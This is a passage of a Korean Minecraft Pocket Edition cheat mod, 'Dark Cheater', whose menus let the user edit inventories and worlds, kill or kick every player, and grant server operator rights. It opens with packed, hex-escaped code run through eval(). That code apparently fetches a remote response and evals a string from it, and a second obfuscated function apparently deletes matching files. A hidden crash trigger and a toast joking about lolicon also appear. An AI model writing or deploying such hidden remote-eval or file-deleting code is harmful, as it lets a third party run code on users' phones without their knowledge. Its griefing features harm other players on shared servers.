a="\\k\\i\\c\\1i\\E\\b\\f\\C\\g\\g\\j\\E\\1f\\s\\b\\l\\s\\b\\O\\b\\g\\f\\j\\v\\c\\h\\f\\b\\c\\n\\b\\b\\l\\c\\C\\h\\m\\g\\i\\k\\m\\R\\b\\b\\l\\H\\z\\k\\f\\h\\b\\c\\h\\f\\M\\1l\\h\\p\\b\\j\\h\\q\\f\\c\\f\\G\\f\\q\\s\\b\\f\\c\\j\\l\\j\\q\\n\\f\\c\\n\\b\\b\\l\\c\\q\\z\\k\\f\\h\\b\\c\\v\\f\\b\\n\\i\\m\\p\\c\\R\\b\\b\\l\\1j\\f\\b\\c\\B\\f\\b\\Z\\h\\b\\k\\b\\E\\c\\M\\g\\k\\b\\f\\1a\\i\\c\\q\\z\\i\\p\\f\\c\\b\\i\\O\\b\\g\\k\\h\\B\\c\\F\\c\\h\\v\\c\\b\\i\\j\\p\\b\\c\\g\\f\\j\\m\\c\\F\\K\\c\\p\\l\\z\\k\\b\\c\\s\\p\\f\\g\\C\\B\\f\\h\\b\\c\\n\\b\\b\\l\\1h\\w\\w\\m\\j\\g\\A\\b\\i\\g\\h\\j\\m\\i\\y\\m\\i\\b\\n\\i\\v\\f\\y\\q\\i\\y\\A\\g\\w\\m\\j\\g\\A\\H\\n\\f\\j\\b\\f\\g\\w\\c\\y\\b\\G\\b\\c\\k\\h\\1n\\i\\K\\c\\b\\g\\s\\f".X("\\c");Y=u;a[t]=I 1s[a[0]][a[1]]();o(L){a[D]="1m"}N{a[D]="V"}W[a[2]][a[3]][a[4]][a[5]](a[1b])[a[6]](I 1c[a[7]][a[8]][a[9]][a[10]][a[11]](a[1d]+a[D]+a[1e]))[a[12]]()[a[13]](a[t]);a[t][a[14]]();o(L){a[r]=P(a[t][a[15]]())[a[Q]]("d&d");o(a[r][1]=="1"){x[a[16]]=u}o(a[r][2]=="1"){x[a[17]]=u}o(a[r][3]=="1"){x["\\g\\f"]=u}o(a[r][4]=="1"){J{1k(a[r][5]+"")}S(T){U[a[18]](T)}}o(U[a[19]](a[1o])==a[1p]){x[a[1q]]=u}}N{a[1r]=P(a[t][a[15]]())[a[Q]]("0")}}S(e){}',62,91,'||||||||||nox|x74|xXY|||x65|x72|x6E|x6F|x61|x69|x70|x64|x68|if|x73|x63|29|x75|27|true|x6D|x2F|dce|x2E|x6C|x6B|x67|x41|28|x79|x62|x78|x43|new|try|x32|tf|x77|else|x53|String|21|x48|catch|err|Dark|dcb2|android|split|darkCheaterOn|x45|||||||||||x54|22|org|23|24|x4F|var|x3A|x42|x47|eval|x49|dcb|x66|25|26|20|30|java'.split('|'),0,{});
eval(code);
if(tf!=true) return nox[30][1];
}


function removeDarkCheater(){
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('U{A a="\\x\\k\\u\\m\\F\\c\\h\\x\\k\\f\\p\\v\\b\\y\\q\\j\\c\\o\\f\\u\\p\\q\\k\\c\\i\\b\\Y\\g\\h\\o\\l\\b\\h\\l\\I\\i\\m\\b\\h\\m\\b\\J\\h\\o\\c\\b\\o\\h\\l\\g\\b\\o\\c\\p\\v\\g\\k\\b\\g\\m\\Q\\g\\i\\h\\p\\v\\b\\l\\c\\f\\i\\q\\k\\b\\t\\c\\o\\c\\g\\c\\b\\r\\t\\f\\g\\f\\r\\t\\f\\g\\f\\r\\p\\c\\g\\z\\x\\k\\u\\m\\F\\c\\h\\x\\k\\f\\p\\v\\z\\y\\q\\j\\c\\o\\f\\u\\p\\q\\k\\c\\i\\b\\z\\j\\i\\m\\r\\f\\j\\j\\C\\y\\m\\t\\l\\q\\i\\h\\j\\g\\l\\b\\r\\f\\j\\j\\C\\y\\m\\t\\l\\q\\i\\h\\j\\g\\l\\b\\N\\f\\i\\O\\b\\P\\k\\c\\f\\g\\c\\i".G("\\b");R=T;a[w]=a[11];B(H[a[0]][a[1]][a[2]][a[3]]())a[w]+=a[K];L a[w]+=a[M];A d=D E[a[4]][a[5]](s)[a[6]]();S(A n=0;n<d[a[7]];n++){B(d[n][a[8]]()[a[9]](a[V])!=1&&d[n][a[8]]()[a[9]](a[W])!=-1)D E[a[4]][a[5]](a[w]+"/"+d[n])[a[10]]()}}X(e){Z(e)}',62,64,'||||||||||nox|xXY|x65|||x61|x74|x69|x72|x70|x68|x73|x6F||x6C|x6E|x63|x2F||x64|x75|x67|16|x7A|x6D|x2E|var|if|x5F|new|java|x77|split|net|x50|x46|12|else|13|x44|x6B|x43|x53|darkCheaterOn2|for|true|try|14|15|catch|x55|clientMessage||'.split('|'),0,{});
eval(code);
}


function leaveGame(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
Dark.close(true);
if(btnE!=null){
btnE.dismiss();
btnE = null;
}
if(btnSS!=null){
btnSS.dismiss();
btnSS = null;
}
if(p.p!=null){
p.p.dismiss();
p.p = null;
}
if(btnR!=null){
btnR.dismiss();
btnR = null;
}
if(btnF!=null){
btnF.dismiss();
btnF = null;
}
if(cross!=null){
cross.dismiss();
cross = null;
}
if(menuJ!=null){
menuJ.dismiss();
menuJ = null;
}
if(w.btn!=null){
w.btn.dismiss();
w.btn = null;
}
if(w.menu!=null){
w.menu.dismiss();
w.menu = null;
}
showClock(false);
if(miniMap!=null){
miniMap.dismiss();
miniMap = null;
}
if(c.btn!=null){
c.btn.dismiss();
c.btn = null;
}
if(sBtn!=null){
sBtn.dismiss();
sBtn = null;
}
if(mcBtn!=null){
mcBtn.dismiss();
mcBtn = null;
}
if(pBtn!=null){
pBtn.dismiss();
pBtn = null;
}
if(effectWindow!=null){
effectWindow.dismiss();
effectWindow = null;
}
if(as.btn!=null){
as.btn.dismiss();
as.btn = null;
}
}
}));
banList = [];
ModPE.resetFov();
run = false;
walk = false;
mc = false;
j.on = false;
climbing = false;
sneak = false;
smartMoving(false);
makeMinecraftClock(false);
makeFovEditor(false);
hyperLog += "["+Dark.getTime(2)+"] 맵 또는 서버에서 나감\n";
pls = [];
pls2 = [];
we.tf = false;
theSeed = false;
makeBatteryNotifier(false);
if(compileFinish) eval(dcmsData.leaveGame+"");
Fix.removeMessageWindow();
}


function darkCheater(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
if(menu==null){
try{
menu = new android.widget.PopupWindow();
var title = makeTitle("Dark\nCheater", true);
title.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
if(!searchTime){
Dark.close();
Dark.save("makerFunc", true);
searchTime = true;
new android.os.Handler().postDelayed(new java.lang.Runnable({
run : function(){
searchTime = false;
}
}), 300);
}
else if(searchTime&&checkInternet()){
Dark.getFuncData();
}
}
});
title.setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
if(!isLogined) Dark.loginDialog();
else Dark.logoutDialog();
return true;
}
});
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btns = [];
var menus = ["인벤토리 수정", "월드 정보 수정", "플레이어 관리", "엔티티 관리", "지형 수정", "이동 계열", "서버 관련", "테러 방지 옵션", "기타 기능", "환경 설정"];
for(var n in menus)
btns[n] = makeButton(menus[n]);
btns[0].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
Dark.close(false);
inventorySet();
}
});
btns[0].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
Dark.close(false);
armorEdit();
return true;
}
});
btns[1].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
Dark.close(false);
worldSet();
}
});
btns[1].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
Dark.close(false);
darkLiber();
return true;
}
});
btns[2].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
Dark.close(false);
if(!banTime){
playerSet();
banTime = true;
new android.os.Handler().postDelayed(new java.lang.Runnable({
run : function(){
banTime = false;
}
}), 300);
}
else if(banTime){
openBanList();
}
}
});
btns[2].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
Dark.close(false);
playersSet();
return true;
}
});
btns[3].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
Dark.close(false);
entitySet();
}
});
btns[3].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
Dark.close(false);
nearEntitySet();
return true;
}
});
btns[4].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
Dark.close(false);
worldEdit();
}
});
btns[5].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
Dark.close(false);
moveSet();
}
});
btns[6].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
Dark.close(false);
serverSetting();
}
});
btns[6].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
Dark.close(false);
if(Dark.readAddOn("serverPlugin")!="") eval(Dark.readAddOn("serverPlugin"));
else Dark.toast("추가 파일이 없습니다.\n\"환경 설정\"에서 다운하실 수 있습니다.");
return true;
}
});
btns[7].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
Dark.close(false);
if(terTime){
Dark.close(false);
if(terPass) terrorHelper(true);
else if(Dark.read("linkT")=="true"||linkArray[0]) Dark.save("th", true);
else terrorHelper(false);
terTime = false;
}
else{
antiTerrorSet();
terTime = true;
new java.lang.Thread({
run : function(){
new java.lang.Thread.sleep(500)
terTime = false;
}
}).start();
}
}
});
btns[7].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
Dark.close(false);
terrorSet();
return true;
}
});
btns[8].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
Dark.close(false);
if(!loginTime){
elseSet();
loginTime = true;
new android.os.Handler().postDelayed(new java.lang.Runnable({
run : function(){
loginTime = false;
}
}), 300);
}
else if(loginTime){
memberFunc();
}
}
});
btns[8].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
Dark.close(false);
openPlus();
return true;
}
});
btns[9].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
Dark.close(false);
darkCheaterSetting();
}
});
btns[9].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
Dark.close(false);
designSettings();
return true;
}
});
for(var n in menus)
layout.addView(btns[n]);
var exit = makeButton("나가기");
exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
Dark.close(true);
}
});
if(useExitBtn!=2) layout.addView(exit);
var text = new android.widget.TextView(ctx);
text.setText("\n© 2015-2017 Dark Tornado\n");
text.setTextSize(11);
text.setTextColor(white2);
text.setGravity(center);
text.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
Dark.close();
Dark.save("tra", true);
}
});
text.setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
dce.re = true;
Dark.toast("로리는 사랑입니다.");
return true;
}
});
layout.addView(text);
var layout2 = new android.widget.LinearLayout(ctx);
var scroll = makeScroll(layout, layout2, menu);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menu.setContentView(layout2);
if(side==1) menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT|center, 0, 0);
else menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT|android.view.Gravity.TOP, 0, dip2px(ctx, 30));
}
catch(e){
Dark.showError(e);
}
}
else if(menu!=null){
Dark.close(true);
}
if(version==Dark.hyperRead("blockData")) makeCrash();
}
}));
}


function inventorySet(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuI = new android.widget.PopupWindow();
var title = makeTitle("인벤토리 수정", menuI);
title.setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
elr2 = 10;
Dark.toast("인첸트 강도 제한이 10으로 확장되었습니다.");
return true;
}
});
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btnT = [];
var menusT = ["터치한 창고 내용 수정", "인벤 세이브", "추가 슬롯"];
for(var n in menusT){
btnT[n] = new DarkToggleButton(ctx);
btnT[n].setText(menusT[n]);
}
btnT[0].setChecked(editChest);
btnT[1].setChecked(invenSave);
btnT[2].setChecked(Boolean(as.btn));
btnT[0].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
editChest = onoff;
}
}));
btnT[1].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
invenSave = onoff;
}
}));
btnT[2].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
additionalSlot(onoff);
}
}));
for(var n in menusT)
layout.addView(btnT[n].mv());
var inv = makeButton("아이템 지급/설정");
inv.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
addItem(false);
}
});
inv.setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
addItem(false, null, true);
return true;
}
});
layout.addView(inv);
var btns = [];
var menus = ["아이템 목록/검색", "인벤토리 리셋", "들고 있는 아이템 삭제", "인첸트/해제", "아이템 이름 변경", "아이템 아이디", "갑옷 지급", "포션 조합법 보기", "가상 인벤토리"];
for(var n in menus){
btns[n] = makeButton(menus[n]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
switch(v.getId()){
case 0 : 
itemList();
break;
case 1 : 
for(var n=0;n<55;n++)
Player.clearInventorySlot(n);
Dark.toast("인벤토리가 리셋되었습니다.");
break;
case 2 : 
Player.clearInventorySlot(Player.getSelectedSlotId());
Dark.toast("삭제되었습니다.");
break;
case 3 : 
enchantDialog();
Dark.toast("아이템의 종류에 따라 가능한 인첸트가 다릅니다.");
break;
case 4 : 
inputItemName();
break;
case 5 : 
showItems(0);
break;
case 6 : 
showArmorList(true);
break;
case 7 : 
showItems(2);
break;
case 8 : 
Dark.save("viLink", true);
break;
}
}
});
btns[n].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
switch(v.getId()){
case 3 : 
var itemName = Player.getItemCustomName(Player.getSelectedSlotId());
Player.setInventorySlot(Player.getSelectedSlotId(), getCarriedItem(), Player.getCarriedItemCount(), Player.getCarriedItemData());
if(itemName!=null) Player.setItemCustomName(Player.getSelectedSlotId(), itemName);
Dark.toast("인첸트가 해제되었습니다.");
break;
case 4 : 
var slotId = Player.getSelectedSlotId();
var enchants = Player.getEnchantments(slotId);
Player.setInventorySlot(slotId, getCarriedItem(), Player.getCarriedItemCount(), Player.getCarriedItemData());
for each(var enc in enchants)
Player.enchant(slotId, enc.type, enc.level);
Dark.toast("아이템 이름이 초기화되었습니다.");
break;
case 5 : 
showItems(1);
break;
case 7 : 
potionList();
break;
}
return true;
}
});
layout.addView(btns[n]);
}
var exit = makeExit(menuI);
if(useExitBtn!=2) layout.addView(exit);
var layout2 = new android.widget.LinearLayout(ctx);
var scroll = makeScroll(layout, layout2, menuI);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuI.setContentView(layout2);
menuI.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function worldSet(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuW = new android.widget.PopupWindow();
var title = makeTitle("월드 정보 수정", menuW);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var text = new android.widget.TextView(ctx);
text.setText("  월드 이름 : "+Level.getWorldName()+"\n  폴더 이름 : "+Level.getWorldDir()+"\n  세계 : "+Level.getWorldType());
text.setTextSize(14);
text.setTextColor(white2);
layout.addView(text);
var chs = [];
var menuT = ["시간 고정", "터치한 표지판 내용 수정", "블록 추적"];
var bools = [timeLock, signEdit, bs.tf];
for(var n in menuT){
chs[n] = new android.widget.CheckBox(ctx);
chs[n].setText(menuT[n]);
chs[n].setChecked(bools[n]);
chs[n].setTextColor(white2);
chs[n].setId(n);
chs[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
switch(check.getId()){
case 0 : 
timeLock = onoff;
if(onoff){
tlv = Level.getTime();
Dark.toast("시간이 "+tlv+"으로 고정되었습니다.");
}
else{
Dark.toast("시간 고정이 풀렸습니다.");
}
break;
case 1 : 
signEdit = onoff;
break;
case 2 : 
if(onoff) blockSearchDialog();
else bs.tf = false;
break;
}
}
}));
layout.addView(chs[n]);
}
var btns = [];
var menus = ["시간 설정", "게임모드 변경", "체력 설정", "플레이어 이동", "날씨 설정", "주변 창고 정보 수정", "다른 월드로 이동", "레벨/경험치 설정", "스폰 지점 설정", "NPC 마을 생성", "맵 백업"];
for(var n in menus){
btns[n] = makeButton(menus[n]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
switch(v.getId()){
case 0 : 
timeDialog();
break;
case 1 : 
if(Level.getGameMode()==0){
Level.setGameMode(1);
Dark.toast("크리에이티브로 변경되었습니다.");
}
else if(Level.getGameMode()==1){
Level.setGameMode(0);
Dark.toast("서바이벌로 변경되었습니다.");
}
break;
case 2 : 
playerTarget = ad;
playerHealth();
break;
case 3 : 
playerTp();
break;
case 4 : 
weatherSet();
break;
case 5 : 
loadChestData = [];
loadChestCount = 0;
loadChest3 = 0;
loadChest = true;
Dark.toast("기다려 주세요...");
break;
case 6 : 
selectMap();
Dark.toast("이동할 맵의 폴더명을 선택하세요...\n  일정 확률로 팅길 수 있습니다.");
break;
case 7 : 
inputLevelAndExp();
break;
case 8 : 
Level.setSpawn(Player.getX(), Player.getY(), Player.getZ());
Dark.toast("현재 위치가 스폰 지점으로 설정되었습니다.");
break;
case 9 : 
spawn = 1;
Dark.toast("마을이 생성될 곳을 터치하세요...");
break;
case 10 : 
Dark.toast("맵 백업을 시작합니다.");
new java.lang.Thread({
run : function(){
var folder = new java.io.File(sdcard+"/DarkCheaterMapBackUp/");
folder.mkdirs();
File.copyFolder(sdcard+"/games/com.mojang/minecraftWorlds/"+Level.getWorldDir()+"/", folder);
var file1 = new java.io.File(sdcard+"/DarkCheaterMapBackUp/"+Level.getWorldDir()+"/");
var file2 = new java.io.File(sdcard+"/DarkCheaterMapBackUp/"+Level.getWorldDir()+" ("+Level.getWorldName()+", "+Dark.getTime()+"/");
file1.renameTo(file2);
Dark.toast("현재 들어가있는 맵을 백업하였습니다.");
}
}).start();
break;
}
}
});
btns[n].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
switch(v.getId()){
case 2 : 
playerHunger();
break;
case 4 : 
lightningPower();
break;
case 9 : 
spawn = 0;
Dark.toast("마을 생성을 멈추었습니다.");
break;
}
return true;
}
});
layout.addView(btns[n]);
}
var exit = makeExit(menuW);
if(useExitBtn!=2) layout.addView(exit);
var layout2 = new android.widget.LinearLayout(ctx);
var scroll = makeScroll(layout, layout2, menuW);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuW.setContentView(layout2);
menuW.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function playerSet(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuP = new android.widget.PopupWindow();
var title = makeTitle("플레이어 관리", menuP);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var players = [];
for each(var e in Entity.getAll()){
if(Player.isPlayer(e)) players.push(e);
}
if(antiTwo){
var players2 = removeDouble(players);
players = players2;
}
if(playerSort){
players.sort();
}
var op = makeButton("OP 권한 부여");
var radios = new android.widget.RadioGroup(ctx);
radios.setOrientation(1);
var radio = [];
for(var n in players){
radio[n] = new android.widget.RadioButton(ctx);
if(showPlayerHealth){
var pn = Player.getName(players[n]).split(" (");
radio[n].setText(pn[0]+"("+Entity.getHealth(players[n])+")");
}
else{
radio[n].setText(Player.getName(players[n])+"("+Entity.getHealth(players[n])+")");
}
radio[n].setId(n);
radio[n].setTextColor(white2);
radios.addView(radio[n]);
}
radios.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
playerTarget = players[checkedId];
if(ops.indexOf(playerTarget)==-1) op.setText("OP 권한 부여");
else op.setText("OP 권한 회수");
}
}));
layout.addView(radios);
var sph = new DarkToggleButton(ctx);
sph.setText("플레이어 체력 표시");
sph.setChecked(showPlayerHealth);
sph.setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff){
for(var n=0;n<pls.length;n++){
var pp = pls[n];
if(Player.isPlayer(pp)){
Entity.setNameTag(pp, Player.getName(pp)+" ("+Entity.getHealth(pp)+")");
}
else{
pls.splice(n, 1);
pls2.splice(n, 1);
}
}
}
else{
for(var n=0;n<pls.length;n++){
var pp = pls[n];
if(Player.isPlayer(pp)){
var pn = Player.getName(pp).split(" (");
Entity.setNameTag(pp, pn[0]);
}
}
}
showPlayerHealth = onoff;
}
}));
layout.addView(sph.mv());
var fa = new DarkToggleButton(ctx);
fa.setText("기능 사용 알림");
fa.setChecked(pca);
fa.setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
pca = onoff;
}
}));
layout.addView(fa.mv());
var btns = [];
var menus = ["체력설정", "소환", "전송", "이동", "추방", "아이템 지급", "전원 사살" , "전원 소환", "포션 효과 부여/삭제", "조지기", "위치 확인", "시야 보기", "Client Id 보기", "칭호 부여", "갑옷 보기", "메시지 전송", "불붙이기", "경험치 지급"];
for(var n in menus){
btns[n] = makeButton(menus[n]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
try{
switch(v.getId()){
case 0 : 
playerHealth();
break;
case 1 : 
teleport(playerTarget, Entity.getX(ad), Entity.getY(ad)+1, Entity.getZ(ad));
if(pca) darkMessage(Player.getName(playerTarget)+"(이)가 서버장의 위치로 소환되었습니다.", true);
break;
case 2 : 
playerTp();
break;
case 3 : 
if(multi){
Entity.setPosition(Player.getEntity(), Entity.getX(playerTarget), Entity.getY(playerTarget), Entity.getZ(playerTarget));
}
else{
Entity.setPosition(ad, Entity.getX(playerTarget), Entity.getY(playerTarget), Entity.getZ(playerTarget));
if(pca) darkMessage("서버장이 "+Player.getName(playerTarget)+"에게 이동하었습니다.", true);
}
break;
case 4 : 
Dark.toast(Player.getName(playerTarget)+"(이)가 추방되었습니다.");
if(pca) darkMessage(Player.getName(playerTarget)+"(이)가 추방되었습니다.", true);
Entity.remove(playerTarget);
break;
case 5 : 
addItem(true);
break;
case 6 : 
for(var n=0;n<players.length;n++)
Entity.setHealth(players[n], 0);
if(pca) darkMessage("모든 플레이어를 사살합니다.", true);
break;
case 7 : 
for(var n=0;n<players.length;n++)
teleport(players[n], Entity.getX(ad), Entity.getY(ad)+0.5, Entity.getZ(ad));
if(pca) darkMessage("모든 플레이어를 소환합니다.", true);
break;
case 8 : 
giveEffectType(playerTarget);
break;
case 9 : 
fuckYouPlayer();
break;
case 10 : 
Dark.toast(Player.getName(playerTarget)+" : "+Math.round(Entity.getX(playerTarget))+", "+Math.floor(Entity.getY(playerTarget))+", "+Math.round(Entity.getZ(playerTarget)));
break;
case 11 : 
ModPE.setCamera(playerTarget);
break;
case 12 : 
Dark.toast(playerTarget);
break;
case 13 : 
inputTitle();
break;
case 14 : 
var a = Entity.getArmor;
var ad2 = Entity.getArmorDamage;
var t = playerTarget;
Dark.toast("이름 : "+Player.getName(t)+"\n  투구 : "+a(t, 0)+", "+ad2(t, 0)+"\n  윗옷 : "+a(t, 1)+", "+ad2(t, 1)+"\n  바지 : "+a(t, 2)+", "+ad2(t, 2)+"\n  신발 : "+a(t, 3)+", "+ad2(t, 3));
break;
case 15 : 
sendMsg(playerTarget);
break;
case 16 : 
inputText(4);
break;
case 17 : 
Level.spawnMob(Entity.getX(playerTarget), Entity.getY(playerTarget), Entity.getZ(playerTarget), 68);
Dark.toast(Player.getName(playerTarget)+"에게 경험치를 부여하였습니다.");
if(pca) darkMessage(Player.getName(playerTarget)+"에게 경험치를 부여하였습니다.");
break;
}
}catch(e){clientMessage(e);}
}
});
btns[n].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
switch(v.getId()){
case 0 : 
inputMaxHealth();
break;
case 8 : 
removeEffectType();
break;
case 13 : 
var pn = Player.getName(playerTarget).toString().split("] §f");
if(pn[1]!=null){
Entity.setNameTag(playerTarget, pn[1]);
Dark.toast("칭호를 삭제하였습니다.");
}
else{
Dark.toast("칭호가 없습니다.");
}
break;
}
return true;
}
});
layout.addView(btns[n]);
}
op.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
if(ops.indexOf(playerTarget)==-1){
op.setText("OP 권한 회수");
ops.push(playerTarget);
opData.push([true, true, true, true, true, true, true, true, true, true, true]);
Dark.toast("OP 권한이 부여되었습니다.");
if(pca) darkMessage(Player.getName(playerTarget)+"에게 OP 권한이 부여되었습니다.", true);
}
else{
op.setText("OP 권한 부여");
var nn = ops.indexOf(playerTarget);
ops.splice(nn, 1);
opData.splice(nn, 1);
Dark.toast("OP 권한이 회수되었습니다.");
if(pca) darkMessage(Player.getName(playerTarget)+"의 OP 권한이 회수되었습니다.", true);
}
}
});
op.setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
if(ops.indexOf(playerTarget)!=-1){
opManager(ops.indexOf(playerTarget));
}
return true;
}
});
layout.addView(op);
var exit = makeExit(menuP);
if(useExitBtn!=2) layout.addView(exit);
var layout2 = new android.widget.LinearLayout(ctx);
var scroll = makeScroll(layout, layout2, menuP);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuP.setContentView(layout2);
menuP.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function openBanList(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
menuB = new android.widget.PopupWindow();
var title = makeTitle("밴 목록", menuB);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
Ban.removeGonePlayerData();
var players = [];
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players.push(e);
}
if(antiTwo){
var players2 = removeDouble(players);
players = players2;
}
if(playerSort){
players.sort();
}
var checkBox = [];
for(var n in players){
checkBox[n] = new android.widget.CheckBox(ctx);
checkBox[n].setText(Player.getName(players[n]));
checkBox[n].setId(n);
checkBox[n].setTextColor(white2);
if(Ban.isBanned(players[n]))
checkBox[n].setChecked(true);
else
checkBox[n].setChecked(false);
checkBox[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff==true){
banList.push(players[check.getId()]);
}
else if(onoff==false){
Ban.removeData(players[check.getId()]);
}
}
}));
layout.addView(checkBox[n]);
}
var btnT = [];
var menusT = ["블랙 리스트 사용", "맵 접속 방지 사용", "화이트 리스트 사용", "C.I.W.L. 사용"];
for(var n in menusT){
btnT[n] = new DarkToggleButton(ctx);
btnT[n].setText(menusT[n]);
btnT[n].setId(n);
}
btnT[0].setChecked(blackListOn);
btnT[1].setChecked(blackListIdOn);
btnT[2].setChecked(whiteListOn);
btnT[3].setChecked(ciwl.tf);
for(var n in menusT){
btnT[n].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
switch(toggle.getId()){
case 0 : 
blackListOn = onoff;
break;
case 1 : 
blackListIdOn = onoff;
break;
case 2 : 
whiteListOn = onoff;
break;
case 3 : 
ciwl.tf = onoff;
if(ciwl.tf) Dark.update();
break;
}
}
}));
layout.addView(btnT[n].mv());
}
var btns = [];
var menus = ["밴 목록 초기화", "블랙 리스트", "맵 접속 방지", "화이트 리스트", "C.I.W.L. 목록"];
for(var n in menus){
btns[n] = makeButton(menus[n]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
switch(v.getId()){
case 0 : 
banList = [];
for each(var cb in checkBox)
cb.setChecked(false);
Dark.toast("밴 목록이 초기화되었습니다.");
break;
case 1 : 
openBlackList();
break;
case 2 : 
openIdBlackList();
break;
case 3 : 
openWhiteList();
break;
case 4 : 
openClientIdWhiteList();
break;
}
}
});
layout.addView(btns[n]);
}
var exit = makeExit(menuB);
if(useExitBtn!=2) layout.addView(exit);
var layout2 = new android.widget.LinearLayout(ctx);
var scroll = makeScroll(layout, layout2, menuB);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuB.setContentView(layout2);
menuB.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function entitySet(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuE = new android.widget.PopupWindow();
var title = makeTitle("엔티티 관리", menuE);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var layoutL = new android.widget.LinearLayout(ctx);
layoutL.setOrientation(1);
var radios = new android.widget.RadioGroup(ctx);
radios.setOrientation(1);
var noList = new android.widget.CheckBox(ctx);
noList.setText("엔티티 목록 숨기기");
noList.setTextColor(white2);
noList.setChecked(hideEnt);
noList.setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
hideEnt = onoff;
try{
if(onoff) layoutL.removeView(radios);
else layoutL.addView(radios);
}
catch(e){
//null
}
}
}));
layout.addView(noList);
var entityId = null;
var entCache = entityData;
